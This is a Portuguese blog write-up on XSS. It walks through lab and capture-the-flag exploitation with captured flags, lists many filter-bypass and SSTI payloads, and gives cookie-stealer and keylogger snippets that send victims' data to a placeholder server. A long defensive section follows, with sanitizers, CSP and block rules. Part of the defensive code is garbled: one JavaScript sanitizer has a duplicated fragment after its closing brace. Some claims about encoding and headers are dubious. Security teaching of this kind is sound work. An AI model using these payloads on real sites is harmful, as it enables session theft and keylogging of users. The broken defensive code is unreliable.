---
title: XSS e HTML Injection - Tipos e Exploração
description: 'Entendendo Cross-Site Scripting: Reflected, Stored e DOM-based XSS com exemplos práticos'
author: matheus
tags: ["XSS", "web security", "javascript", "vulnerability", "pentesting", "Stored XSS", "Reflected XSS", "DOM-based XSS", "HTML Injection"]
categories: ["SecLab", "WayOfSec", "Hacking", "Write Ups"]
pin: false
comments: true

---

## Entendendo XSS: Reflected, Stored e DOM-based

Se você já tentou fazer um input numa página web e viu seu texto aparecer na tela, provavelmente passou pela cabeça: "e se eu puder alterar o HTML ou botar um JavaScript aqui?". Bem, essa curiosidade é exatamente o que leva ao XSS - Cross-Site Scripting.

## O que é XSS?

XSS é quando conseguimos injetar código JavaScript numa aplicação web e fazer ele rodar no navegador de outras pessoas. Parece simples, mas as consequências podem ser gigantes.

Com XSS dá pra roubar cookies e sessões de login, capturar tudo que a vítima digita (keylogger), criar formulários falsos na própria página legítima pra phishing, redirecionar pro site malicioso que você quiser, ou até modificar completamente a aparência do site. O mais insidioso é que a vítima vê a URL original do site, então confia completamente no que está vendo.

## Reflected XSS - O clássico

**Como funciona:** O servidor "reflete" de volta exatamente o que você enviou, sem filtrar nada. É tipo um espelho - você manda algo, ele mostra de volta na página.

### Exemplo prático

Imagina uma página de pesquisa simples:

```html
<!-- index.html -->
<form method="GET">
    <input type="text" name="q" placeholder="Pesquisar...">
    <input type="submit" value="Buscar">
</form>
```

 - Formulário no HTML (frontend)

```php
<!-- PHP no topo do arquivo -->
<?php
if (isset($_GET['q']) && !empty($_GET['q'])) {
    echo "Você pesquisou por: " . $_GET['q'];
}
?>
```

 - PHP no topo do arquivo (backend)

**Testando a vulnerabilidade:**

Primeiro, vamos ver se aceita injeção de HTML:
```url
?q=<b>teste em negrito</b>
```

Se aparecer **teste em negrito**, temos confirmação de HTML injection. Agora o passo natural é testar tag `script`:

```url
?q=<script>alert("XSS funcionando!")</script>
```

**Bypass de filtros básicos:**

Quando você testa XSS e o site bloqueia certas palavras, é hora de ser criativo. Vamos ver as formas de testar XSS:

**1. Fechando tags existentes:**
```html
?q="><script>alert('bypass')</script>
```
Isso funciona porque muitas vezes seu input vai parar dentro de um atributo HTML tipo `<input value="SEU_INPUT">`. Quando você coloca `">`, você fecha o atributo e a tag, podendo inserir HTML novo. É como "escapar" do contexto atual.

**2. Usando event handlers em tags válidas:**
```html
?q=<img src=x onerror="alert('imagem com erro')">
```
O `onerror` dispara quando a imagem não carrega (e `src=x` obviamente não vai carregar). Funciona mesmo se bloquearem `<script>`.

**3. SVG com JavaScript:**
```html
?q=<svg onload="alert('svg carregado')">
```
O SVG é HTML válido e o `onload` executa assim que o elemento carrega. Muitos filtros esquecem do SVG.

**4. Outras técnicas (até algumas mais avançadas):**
```html
<!-- Se bloquearem aspas, usar / -->
?q=<script>alert(/XSS/)</script>

<!-- Se bloquearem "alert", usar confirm -->
?q=<script>confirm('XSS')</script>

<!-- Usando JavaScript: protocol -->
?q=<a href="javascript:alert('XSS')">clique</a>

<!-- Body onload -->
?q=<body onload="alert('XSS')">

<!-- Obfuscação real que funciona -->
?q=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
<!-- Decodifica para: <script>alert('XSS')</script> -->

<!-- URL encoding duplo -->
?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E

<!-- JavaScript ofuscado com eval + base64 (técnica real) -->
?q=<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
<!-- Base64 decodifica para: alert(1) -->

<!-- String.fromCharCode para burlar filtros de palavras -->
?q=<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<!-- Gera: alert(1) -->

<!-- Quebrar palavras com comentários HTML -->
?q=<scr<!---->ipt>alert(1)</scr<!---->ipt>

<!-- Case mixing (misturar maiúscula/minúscula) -->
?q=<ScRiPt>alert(1)</ScRiPt>

<!-- Abusando de whitespace e quebras de linha -->
?q=<script
>alert(1)</script
>

<!-- Usando caracteres unicode -->
?q=<script>alert\u0028\u0031\u0029</script>
```

**Por que essas técnicas funcionam:**

- **HTML entities**: Browsers decodificam automaticamente `&lt;` para `<`
- **URL encoding duplo**: Alguns servidores decodificam duas vezes
- **Base64 + eval**: `eval()` executa string decodificada, burlando filtros de texto
- **String.fromCharCode**: Constrói string dinamicamente, evitando palavras-chave
- **Comentários HTML**: Quebram detecção de padrões `<script>`
- **Case mixing**: Filtros case-sensitive não detectam
- **Whitespace**: Quebra regex mal feitos
- **Unicode**: Representa caracteres de forma alternativa

**Na prática:** Essas técnicas de obfuscação são amplamente documentadas em plataformas como OWASP e relatórios de bug bounty - como os da hackerone -, sendo encontradas frequentemente nessas pesquisas de segurança.

### Explorando na prática

Melhores formas para praticar seria criando a própria máquina vulnerável para entender como é feito, usar o site [phpvuln](http://testphp.vulnweb.com/) e as máquinas de plataformas como tryhackme, hackthebox e até a própria hackingclub - que é o que usarei para neste documento. Outras plataformas excelentes serão recomendadas no final do documento, algumas valem MUITO a pena, viu?

Máquina criada localmente para simular XSS:

```html
<!-- index.html -->
<form method="GET">
    <input type="text" name="q" placeholder="Pesquisar...">
    <input type="submit" value="Buscar">
</form>
```
```php
<!-- PHP no topo do arquivo -->
<?php
if (isset($_GET['q']) && !empty($_GET['q'])) {
    echo "Você pesquisou por: " . $_GET['q'];
}
?>
```
```
http://localhost:8888/index.php?q=<scrip>alert('XSS!!')</script>
```

O navegador vê `<script>` como código legítimo → executa → alert aparece.

Podemos tentar evitar isso no php ao utilizarmos htmlspecialchars

```php
<?php
if (isset($_GET['q']) && !empty($_GET['q'])) {
    echo "Você pesquisou por: " . htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');
}
?>
```

**Agora resolvendo as máquinas do hackingclub**

No container de teste XSS Reflected (10.10.0.3) encontrei um formulário de contato que refletia dados na URL:

```
http://10.10.0.3/?name=matheus&email=matheus%40laidler.com&message=teste
```
 - formulário normal

```
http://10.10.0.3/?name=<b>matheus</b>&email=matheus%40laidler.com&message=teste
```
 - testando injeção html

```
http://10.10.0.3/?name=<script>alert('teste xss')</script>&email=matheus%40laidler.com&message=teste
```
 - testando xss -> gerou flag no formulário

**Resultado:** Flag capturada! `CS{XSS_R3fl3ct3d_34sy}`

**Roubo de sessão via cookie:**

```html
<!--
// Criar cookie de teste no F12
// document.cookie = "sessao=dados_secretos"

// Payload para roubar -->
<script>alert(document.cookie)</script>

<script>
// Enviando para servidor malicioso
fetch('http://meuservidor.com/roubar.php?cookie=' + document.cookie)
</script>
```

**A pegadinha do Reflected XSS:** Você precisa fazer a vítima clicar no seu link malicioso. Por isso funciona bem em phishing - "Clica aqui pra ver sua fatura" e o link tem a payload XSS. A vítima clica, a página executa seu JavaScript, e você rouba a sessão dela.

## Stored XSS - O persistente

**Como funciona:** Sua payload fica salva no servidor (banco de dados, arquivo, etc) e executa toda vez que alguém acessa a página.

### Por que é mais perigoso?

**Stored XSS** é como envenenar o fornecimento de água da cidade, ao invés de entregar um copo de água envenenado diretamente para o alvo (**Reflected**).

- **Sem engenharia social** - Você não precisa convencer ninguém a clicar em nada suspeito
- **Atinge todos** - Todo mundo que visita a página é afetado automaticamente
- **Persistente** - Sua payload fica lá funcionando 24/7 até alguém descobrir e remover
- **Escala real** - Se for um site popular, você pode afetar milhares de pessoas

Enquanto em um deles você precisa fazer engenharia social para convencer a pessoa a beber a água do copo, no outro você envenenou a fonte para que qualquer pessoa que beber, incluíndo seu alvo, irá ser afetada.

### Exemplo prático

Testando o comment box que salva mensagens no servidor:

```html
<!-- Primeiro teste: HTML injection -->
<b>Comentário em negrito</b>
```

Não funcionou imediatamente, apenas ao recarregar a página e fazer puxar do backend: apareceu em negrito. Confirmamos que temos HTML injection. Vamos tentar aplicar javascript:

```html
<!-- Escalando para JavaScript -->
<script>alert('Stored XSS funcionando!')</script>
```

Agora qualquer pessoa que acessar essa página vai ter o script executando automaticamente.

**Resultado:** Flag capturada! `CS{XSS_St0r3d_l1k3_4_b0ss}`

**Diferença técnica:** O backend armazena nossa payload e serve ela pra todos os visitantes, não apenas reflete de volta.

## DOM-based XSS - O invisível

**Como funciona:** A vulnerabilidade está no JavaScript do frontend, não no backend, ou seja, o servidor NUNCA verá a payload.

### Por que DOM-based é diferente?

DOM-based XSS é como um assaltante que entra pela janela enquanto todo mundo está vigiando a porta da frente:

- **Backend cego** - O servidor nem sabe que tem JavaScript malicioso rodando
- **Manipulação direta** - O próprio JavaScript da página processa seus dados e se sabota
- **Invisível nos logs** - Não deixa rastro no servidor, só no navegador da vítima
- **Mais difícil de encontrar** - Ferramentas de scanner não detectam facilmente

Basicamente, você usa o próprio código JavaScript da página contra ela mesma.

### Encontrando DOM XSS no container

Nesse container DOME do hackingclub temos com um campo de pesquisa que funcionava, printava na tela o que pesquisamos e refletia a pesquisa na url:

```text
parametro url> 10.10.0.3/?search=teste

0 resultados para 'teste'
```

Inspecionando o código, vi que o "teste" nem aparecia no HTML fonte, como se teste fosse o valor de uma variável. 

Então logo o código vulnerável foi encontrado:

```html
<h1><span>0 results for '</span><span id="searchMessage"></span><span>'</span></h1>

<script>
    function pesquisar(pesquisa) {
        document.getElementById('searchMessage').innerHTML = pesquisa;
    }

    var pesquisa = (new URLSearchParams(window.location.search)).get('search');
    if (pesquisa) {
        pesquisar(pesquisa);
    }
</script>

```

Um resumo rápido do que encontramos é o fato do front-end estar alterando o conteúdo da variável, o que queremos pesquisar está dentro de `searchMessage` e o maior problema está no `innerHTML` sem sanitização, permitindo injeção de payload XSS.

**Testando injeção no paramertro da url:**
```html
?search=<b style="color: red">texto vermelho</b>
```

Funcionou! Agora JavaScript:
```html
?search=<script>alert('DOM XSS funcionando!')</script>
```

**Resultado:** Flag capturada! `CS{XSS_D0M_B4s3d}`

**Diferença técnica:** O frontend manipula o DOM diretamente baseado nos parâmetros da URL, sem enviar nada pro servidor.

## Payloads que realmente funcionam

Depois de testar XSS em diferentes laboratórios e sites, aqui estão alguns payloads que podem ter utilidade para seus estudos. Cada um tem sua especialidade, deixarei alguns abaixo com base no que apresentamos nesta documentação:

### Básicos para teste

```html
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
```

### Bypass de filtros

```html
<!-- Se bloquear "script" --> 
<img src=x onerror="alert('bypass')">

<!-- Se bloquear "alert" --> 
<script>confirm('bypass')</script>

<!-- Se bloquear aspas -->
<script>alert(/XSS/)</script>

<!-- Encoding --> 
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- Event handlers -->
<input onfocus="alert('XSS')" autofocus>
```

### Cookie stealer

```javascript
var cookie = document.cookie;
var img = new Image();
img.src = "http://meuservidor.com/roubar.php?cookie=" + cookie;
```

### Keylogger básico

```javascript
document.addEventListener('keypress', function(e) {
    var img = new Image();
    img.src = "http://meuservidor.com/keys.php?key=" + e.key;
});
```

### Redirecionamento

```javascript
window.location = "http://sitemalicioso.com";
```

### Explorando diferentes tecnologias

**Server-Side Template Injection (SSTI) que vira XSS:**

Algumas aplicações usam template engines que podem ser explorados:

{% raw %}

```javascript
// Jinja2 (Python/Flask)
{{7*'7'}} // Testa se executa (retorna 7777777)
{{config.items()}} // Vaza configurações
{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].exit()}}

// Handlebars (Node.js)
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{#with string.concat("alert('XSS')") as |payload|}}
        {{#each conslist}}
          {{#with string.concat(this,payload) as |expr|}}
            {{constructor.constructor(expr)()}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

// Angular (1.x)
{{constructor.constructor('alert("XSS")')()}}
```

{% endraw %}

**GraphQL injection:**
```javascript
// Em queries GraphQL
{
  user(id: "<img src=x onerror=alert(1)>") {
    name
  }
}
```

**JSON injection em APIs:**
```json
{
  "nome": "</script><script>alert('XSS')</script>",
  "email": "test@test.com"
}
```

Esses vetores são específicos de cada tecnologia e requerem conhecimento da stack da aplicação.

## Como não virar vítima (Proteção completa)

Agora que você sabe como explorar XSS, vamos ver como se defender de verdade. É tipo conhecer as táticas do ladrão para trancar a casa direito.

### Regra número 1: Nunca confie no input do usuário

**JAMAIS** coloque dados vindos do usuário diretamente na página. Sempre trate, sempre valide, sempre suspeite. Se você só fizer isso, já evita 90% dos XSS.

### Backend: A primeira linha de defesa

**PHP - Sanitização inteligente:**

```php
<?php
// ERRADO - Vulnerável
echo "Você pesquisou: " . $_GET['q'];

// CORRETO - Sanitização básica
$input = htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');
echo "Você pesquisou: " . $input;

// AINDA MELHOR - Validação + sanitização contra obfuscação
function sanitizar_input_avancado($input) {
    // Remove tags HTML completamente
    $input = strip_tags($input);
    
    // Decodifica HTML entities para detectar payloads ofuscados
    $input = html_entity_decode($input, ENT_QUOTES, 'UTF-8');
    
    // Decodifica URL encoding (uma vez)
    $input = urldecode($input);
    
    // Remove caracteres perigosos
    $input = preg_replace('/[<>"\']/', '', $input);
    
    // Bloqueia palavras-chave mesmo ofuscadas
    $palavras_perigosas = ['script', 'javascript', 'eval', 'onclick', 'onerror', 'onload'];
    foreach ($palavras_perigosas as $palavra) {
        if (stripos($input, $palavra) !== false) {
            return false; // Bloqueia input
        }
    }
    
    // Remove caracteres de controle e unicode suspeitos
    $input = preg_replace('/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/', '', $input);
    $input = preg_replace('/\\\\u[0-9a-fA-F]{4}/', '', $input);
    
    return trim($input);
}

$pesquisa = sanitizar_input_avancado($_GET['q']);
if ($pesquisa === false) {
    die('Input bloqueado por conter conteúdo suspeito');
}

// Validação por tipo de campo
function validar_email($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL);
}

function validar_nome($nome) {
    // Só letras, espaços e acentos
    return preg_match('/^[a-zA-ZÀ-ÿ\s]+$/', $nome);
}
?>
```

**Por que cada função?**

- `htmlspecialchars()`: Converte `<` em `&lt;`, impedindo tags HTML
- `strip_tags()`: Remove todas as tags HTML de uma vez
- `preg_replace()`: Remove caracteres específicos que podem quebrar contexto
- `trim()`: Remove espaços em branco que podem esconder payloads

### Backend em outras linguagens

**Node.js/JavaScript:**
```javascript
const validator = require('validator');
const xss = require('xss');

// Sanitização básica
function sanitizarInput(input) {
    // Remove HTML malicioso
    input = xss(input, {
        whiteList: {}, // Nenhuma tag permitida
        stripIgnoreTag: true,
        stripIgnoreTagBody: ['script']
    });
    
    // Validação adicional
    return validator.escape(input);
}

// Express.js middleware
app.use((req, res, next) => {
    Object.keys(req.body).forEach(key => {
        if (typeof req.body[key] === 'string') {
            req.body[key] = sanitizarInput(req.body[key]);
        }
    });
    next();
});
```

**Python/Django:**
```python
from django.utils.html import escape
from bleach import clean
import re

def sanitizar_input_avancado(input_data):
    # Remove HTML malicioso com bleach
    input_data = clean(input_data, tags=[], strip=True)
    
    # Escape caracteres HTML
    input_data = escape(input_data)
    
    # Detecta obfuscação
    patterns_suspeitos = [
        r'eval\s*\(',
        r'atob\s*\(',
        r'fromCharCode',
        r'javascript:',
        r'\\u[0-9a-fA-F]{4}'
    ]
    
    for pattern in patterns_suspeitos:
        if re.search(pattern, input_data, re.IGNORECASE):
            raise ValueError("Conteúdo suspeito detectado")
    
    return input_data

# No Django views
from django.views.decorators.csrf import csrf_protect

@csrf_protect
def minha_view(request):
    user_input = sanitizar_input_avancado(request.POST.get('input', ''))
```

**Java/Spring:**
```java
import org.owasp.html.PolicyFactory;
import org.owasp.html.Sanitizers;
import org.springframework.web.util.HtmlUtils;

@Component
public class XSSProtection {
    
    private final PolicyFactory policy = Sanitizers.FORMATTING.and(Sanitizers.LINKS);
    
    public String sanitizarInput(String input) {
        // Remove HTML malicioso
        input = policy.sanitize(input);
        
        // Escape caracteres HTML
        input = HtmlUtils.htmlEscape(input);
        
        // Detecta obfuscação
        String[] patterns = {"eval(", "atob(", "fromCharCode", "javascript:"};
        for (String pattern : patterns) {
            if (input.toLowerCase().contains(pattern.toLowerCase())) {
                throw new SecurityException("Conteúdo suspeito detectado");
            }
        }
        
        return input;
    }
}

// No Controller
@PostMapping("/dados")
public ResponseEntity<?> receberDados(@RequestBody String input) {
    String inputLimpo = xssProtection.sanitizarInput(input);
    // processar input limpo
}
```

**React (frontend adicional):**
```jsx
import DOMPurify from 'dompurify';

// Componente seguro
function ComponenteSeguro({ userContent }) {
    // NUNCA faça isto:
    // return <div dangerouslySetInnerHTML={{__html: userContent}} />
    
    // Faça isto:
    const conteudoLimpo = DOMPurify.sanitize(userContent);
    return <div dangerouslySetInnerHTML={{__html: conteudoLimpo}} />
    
    // Ou melhor ainda:
    return <div>{userContent}</div> // React escapa automaticamente
}

// Hook personalizado para sanitização
function useSanitizedInput(input) {
    const [sanitized, setSanitized] = useState('');
    
    useEffect(() => {
        const cleaned = DOMPurify.sanitize(input, {
            ALLOWED_TAGS: [],
            ALLOWED_ATTR: []
        });
        setSanitized(cleaned);
    }, [input]);
    
    return sanitized;
}
```

### Configurações no servidor (.htaccess)

Coloque isso no seu `.htaccess` para uma proteção extra:

```apache
# Bloquear caracteres perigosos na URL
RewriteEngine On
RewriteCond %{QUERY_STRING} [<>] [OR]
RewriteCond %{QUERY_STRING} javascript: [OR]
RewriteCond %{QUERY_STRING} <script [NC,OR]
RewriteCond %{QUERY_STRING} (\<|%3C).*script.*(\>|%3E) [NC,OR]
RewriteCond %{QUERY_STRING} (<|%3C)([^s]*s)+cript.*(>|%3E) [NC,OR]
RewriteCond %{QUERY_STRING} (<|%3C).*iframe.*(>|%3E) [NC]
RewriteRule ^(.*)$ - [F,L]

# Headers de segurança
Header always set X-Content-Type-Options nosniff
Header always set X-Frame-Options DENY
Header always set X-XSS-Protection "1; mode=block"

# Content Security Policy básico
Header always set Content-Security-Policy "default-src 'self'; script-src 'self'"
```

### Entendendo as camadas de defesa (e por que frontend sozinho não basta)

Você tocou num ponto importante: se a proteção está no frontend, não dá para contornar? **Sim, dá.** Por isso defesa em camadas é fundamental.

A **primeira camada** é o backend - sanitização e validação no servidor. Essa não pode ser burlada pelo usuário e protege contra Reflected e Stored XSS. Funciona mesmo se o JavaScript do navegador estiver desabilitado.

A **segunda camada** são os headers HTTP como CSP, X-XSS-Protection e X-Frame-Options. São configurados no servidor mas executados pelo browser, e protegem principalmente contra DOM-based XSS e ataques client-side.

A **terceira camada** é o frontend - sanitização JavaScript, uso correto de APIs como textContent ao invés de innerHTML. Essa pode ser burlada se o atacante controlar o cliente, mas protege usuários normais contra DOM-based XSS. Funciona como última linha de defesa.

**Por que cada camada importa:**

Se você burlar o frontend (desabilitando JavaScript, modificando código), ainda tem o backend bloqueando Reflected e Stored XSS. Se você conseguir injetar no banco (SQL injection + stored XSS), ainda tem o CSP bloqueando execução.

**Exemplo prático de ataque vs defesa:**

```text
Ataque: <script>alert(1)</script>
├─ Frontend: Bloqueia se você não mexer no código
├─ Backend: Bloqueia sempre (htmlspecialchars)
└─ CSP: Bloqueia mesmo se passar backend (script-src 'self')
```

Se uma falhar, as outras seguram. É tipo ter 3 fechaduras na porta.

### Content Security Policy (CSP) - A barreira definitiva

CSP é tipo um segurança na porta da balada - decide quem pode entrar e quem não pode:

```html
<!-- Nível iniciante: só scripts do próprio site -->
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">

<!-- Nível intermediário: específico por tipo de conteúdo -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self' https://apis.google.com; 
               style-src 'self' 'unsafe-inline'; 
               img-src 'self' data: https:;">

<!-- Nível anti-obfuscação: máxima proteção -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self' 'nonce-123abc' 'sha256-hash'; 
               script-src-attr 'none';
               object-src 'none'; 
               base-uri 'none';
               require-trusted-types-for 'script';">
```

**Proteção específica contra obfuscação:**

- `script-src-attr 'none'`: Bloqueia TODOS os event handlers inline (`onclick`, `onerror`, etc)
- `'nonce-123abc'`: Só scripts com nonce específico executam
- `'sha256-hash'`: Só scripts com hash conhecido executam
- `require-trusted-types-for 'script'`: Força uso de Trusted Types API

**Como funciona na prática:**

- `'self'`: Só do mesmo domínio
- `'none'`: Nada permitido  
- `'unsafe-inline'`: Permite scripts inline (NUNCA use!)
- `'unsafe-eval'`: Permite eval() (NUNCA use - usado em obfuscação!)
- URLs específicas: Só de domínios confiáveis
- **Nonce**: Token único por página, impede XSS mesmo com HTML injection

### Frontend: JavaScript seguro

**!!! Perigoso - innerHTML:**
```javascript
// NUNCA faça isso com dados do usuário
document.getElementById('resultado').innerHTML = dadosDoUsuario;
```

**+ Seguro (textContent):**
```javascript
// Sempre use textContent para texto simples
document.getElementById('resultado').textContent = dadosDoUsuario;

// Para HTML específico, sanitize antes
function sanitizarHTML(html) {
    const div = document.createElement('div');
    div.textContent = html;
    return div.innerHTML;
}
```

**Sanitização frontend contra obfuscação:**
```javascript
function sanitizar_completo_anti_obfuscacao(input) {
    // Decodifica HTML entities primeiro
    const textarea = document.createElement('textarea');
    textarea.innerHTML = input;
    input = textarea.value;
    
    // Decodifica URL encoding
    try {
        input = decodeURIComponent(input);
    } catch(e) {
        // Se falhar decodificação, input pode ser malicioso
        return '';
    }
    
    // Remove scripts (inclusive ofuscados)
    input = input.replace(/<script[\s\S]*?<\/script>/gi, '');
    input = input.replace(/<scr[\s\S]*?ipt[\s\S]*?>/gi, ''); // scr<!---->ipt
    
    // Remove TODOS os event handlers (principal vetor de obfuscação)
    input = input.replace(/on\w+\s*=\s*["'][^"']*["']/gi, '');
    input = input.replace(/on\w+\s*=\s*[^>\s]*/gi, '');
    
    // Bloqueia javascript: protocol
    input = input.replace(/javascript\s*:/gi, '');
    
    // Remove eval, atob e fromCharCode (principais funções de obfuscação)
    input = input.replace(/eval\s*\(/gi, '');
    input = input.replace(/atob\s*\(/gi, '');
    input = input.replace(/fromCharCode\s*\(/gi, '');
    
    // Remove tags perigosas
    const tagsPerigosas = ['script', 'iframe', 'object', 'embed', 'form', 'svg'];
    tagsPerigosas.forEach(tag => {
        const regex = new RegExp('<' + tag + '[^>]*>', 'gi');
        input = input.replace(regex, '');
    });
    
    // Remove caracteres unicode suspeitos
    input = input.replace(/\\u[0-9a-fA-F]{4}/g, '');
    
    return input;
}
    input = input.replace(/on\w+\s*=\s*["'][^"']*["']/gi, '');
    
    // Remove javascript: protocol
    input = input.replace(/javascript:/gi, '');
    
    // Remove tags perigosas
    const tagsPerigosas = ['script', 'iframe', 'object', 'embed', 'form'];
    tagsPerigosas.forEach(tag => {
        const regex = new RegExp('<' + tag + '\\b[^>]*>', 'gi');
        input = input.replace(regex, '');
    });
    
    return input;
}

// Validação de URL antes de redirecionamento
function redirecionarSeguro(url) {
    // Só permite URLs do mesmo domínio ou HTTPS
    if (url.startsWith('/') || url.startsWith('https://seudominio.com')) {
        window.location = url;
    } else {
        console.error('Redirecionamento bloqueado: ' + url);
    }
}
```

### Validação de entrada: Cada campo tem sua regra

```php
<?php
function validar_por_campo($valor, $tipo) {
    switch($tipo) {
        case 'nome':
            // Só letras, acentos e espaços
            return preg_match('/^[a-zA-ZÀ-ÿ\s]{2,50}$/', $valor);
            
        case 'email':
            return filter_var($valor, FILTER_VALIDATE_EMAIL);
            
        case 'telefone':
            // Formato brasileiro
            return preg_match('/^\(\d{2}\)\s\d{4,5}-\d{4}$/', $valor);
            
        case 'comentario':
            // Remove HTML, mantém texto
            $limpo = strip_tags($valor);
            return strlen($limpo) <= 500 ? $limpo : false;
            
        case 'url':
            return filter_var($valor, FILTER_VALIDATE_URL);
            
        default:
            return false;
    }
}

// Uso prático
$nome = validar_por_campo($_POST['nome'], 'nome');
if ($nome === false) {
    die('Nome inválido');
}
?>
```

### Detectando obfuscação em tempo real

**Como identificar tentativas de obfuscação:**

```php
<?php
function detectar_obfuscacao($input) {
    $indicadores_suspeitos = [
        'eval(',
        'atob(',
        'fromCharCode',
        'String.fromCharCode',
        'javascript:',
        '<!---->',  // Quebra de palavras
        'script>',  // Possível obfuscação case
        '\\u00',     // Unicode escape
        '%3C',      // < encoded
        '%3E',      // > encoded
        'base64'
    ];
    
    $score_suspeita = 0;
    foreach ($indicadores_suspeitos as $indicador) {
        if (stripos($input, $indicador) !== false) {
            $score_suspeita++;
        }
    }
    
    // Se mais de 2 indicadores, muito suspeito
    if ($score_suspeita >= 2) {
        error_log("Tentativa de XSS ofuscado detectada: " . $input);
        return true;
    }
    
    return false;
}

if (detectar_obfuscacao($_GET['input'])) {
    die('Input bloqueado: conteúdo suspeito detectado');
}
?>
```

### Headers de segurança essenciais

Configure seu servidor para enviar estes headers:

```apache
# Evita que o browser "adivinhe" o tipo de arquivo
X-Content-Type-Options: nosniff

# Impede carregamento em frames (clickjacking)
X-Frame-Options: DENY

# Ativa proteção XSS do browser (backup)
X-XSS-Protection: 1; mode=block

# Força HTTPS (se disponível)
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

### Escape por contexto: Lugar certo, proteção certa

Cada lugar da página precisa de escape diferente:

```php
<?php
$usuario_input = "<script>alert('xss')</script>";

// Para HTML normal
echo htmlspecialchars($usuario_input, ENT_QUOTES, 'UTF-8');
// Saída: &lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt;

// Para JavaScript (dentro de strings)
echo json_encode($usuario_input);
// Saída: "<script>alert('xss')<\/script>"

// Para URLs
echo urlencode($usuario_input);
// Saída: %3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E

// Para CSS (evite se possível)
function escapar_css($input) {
    return preg_replace('/[^a-zA-Z0-9]/', '\\\\$0', $input);
}
?>
```

### Proteção em camadas contra obfuscação

Pra se proteger de payloads obfuscados, o primeiro passo é sempre decodificar HTML entities e URL encoding antes de validar o input - assim você pega o payload "real" e não a versão disfarçada. Bloqueie funções perigosas como `eval`, `atob`, `fromCharCode` e o protocolo `javascript:`. Use CSP restritivo com `script-src-attr 'none'` pra bloquear event handlers inline, force scripts específicos via nonce ou hash, e monitore tentativas de obfuscação nos logs. Se tiver WAF, configure regras específicas pra payloads ofuscados.

Como identificar que alguém tá tentando obfuscar? Fique de olho em múltiplas codificações empilhadas (URL + HTML + Unicode), funções suspeitas nos inputs, quebra de palavras com comentários HTML tipo `scr<!---->ipt`, unicode escapes como `\u0061` no lugar de `a`, e Base64 aparecendo em contextos estranhos.

Lembre-se: atacantes sempre encontram novas formas de obfuscar. A defesa tem que ser em camadas - validação, sanitização, CSP e monitoramento trabalhando juntos.

### Bibliotecas que fazem o trabalho pesado

**Para PHP:**

- **HTML Purifier**: Sanitização HTML completa
- **Twig**: Template engine com escape automático
- **Laminas\Escaper**: Escape por contexto

**Para JavaScript:**

- **DOMPurify**: Sanitização HTML no frontend
- **js-xss**: Biblioteca específica para prevenir XSS

```javascript
// Exemplo com DOMPurify
const dadosLimpos = DOMPurify.sanitize(dadosDoUsuario);
document.getElementById('conteudo').innerHTML = dadosLimpos;
```

### Resumindo a proteção

Pra fechar a parte de defesa: sempre valide e sanitize inputs, faça escape apropriado pro contexto onde o dado vai aparecer (HTML, JavaScript, URL, cada um tem seu método), configure CSP restritivo, use os headers de segurança (X-XSS-Protection, X-Content-Type-Options), HTTPS sempre que possível, mantenha frameworks e bibliotecas atualizados, e rode scanner de vulnerabilidades regularmente.

### O que NÃO funciona

Alguns mitos que vejo por aí: "só bloquear a tag script resolve" - não resolve, existem dezenas de outras formas de executar JavaScript. "Filtro no frontend é suficiente" - nunca é, cliente não é confiável. "WAF resolve tudo" - WAF é complemento, não solução única. "Encoding resolve" - só em contextos específicos. "Blacklist é melhor que whitelist" - whitelist sempre ganha porque você define o que PODE, não o que NÃO PODE (e atacantes são criativos demais pra você prever tudo).

Segurança se faz em camadas. Uma proteção falha? As outras seguram. É como trancar a porta, janela E colocar alarme - paranóico, mas efetivo.

## Ferramentas para testar XSS

Estas são as ferramentas que eu realmente uso, não é só lista de Wikipedia rs.

O **Burp Suite** é o canivete suíço - intercepta e modifica requisições em tempo real, e o Intruder é perfeito pra fuzzing de payloads. O **XSSer** é um scanner automático que testa centenas de payloads diferentes, útil quando você quer varrer rápido. O **BeEF** é um framework pra controlar navegadores comprometidos - muito sinistro, mas mostra bem o potencial real de um XSS explorado. O **OWASP ZAP** é a alternativa gratuita ao Burp, ótima pra quem está começando. E nunca subestime o **F12 do próprio navegador** - as DevTools são poderosas demais pra testar XSS manualmente.

## Labs para praticar sem quebrar a lei

Esses são os playgrounds onde você pode testar à vontade.

O **DVWA** (Damn Vulnerable Web Application) é clássico e muito bom pra começar. O **WebGoat** são os labs oficiais da OWASP, bem didáticos. O **XSS Game** é um desafio interativo do Google que vale a pena. O **bWAPP** é outra aplicação vulnerável com vários níveis de dificuldade. A **PortSwigger Academy** tem labs gratuitos da galera do Burp Suite - muito bem feitos. O **TryHackMe** tem máquinas com XSS e explicações passo a passo, bom pra quem está começando. O **Hacking Club** é meu favorito, tem aulas e máquinas específicas de XSS. E o site `testphp.vulnweb.com` da Acunetix é um site vulnerável de propósito que você pode usar pra estudo.

## O que você precisa lembrar

**Reflected XSS:** O site "cospe" de volta o que você mandou → Precisa convencer a vítima a clicar  
**Stored XSS:** Sua bomba fica plantada no servidor → Explode em todo mundo que visita  
**DOM-based XSS:** O próprio JavaScript da página se sabota → Servidor nem percebe  

**A regra de ouro:** Se você conseguir injetar HTML (tipo `<b>negrito</b>`), provavelmente consegue injetar JavaScript também. É só questão de criatividade para burlar os filtros.

**Dica de ouro:** Sempre teste primeiro com HTML simples. Se funcionar, escalade para JavaScript. Se não funcionar, não perca tempo com payloads complexos.

**Flags capturadas nos testes:**

- Reflected: `CS{XSS_R3fl3ct3d_34sy}`
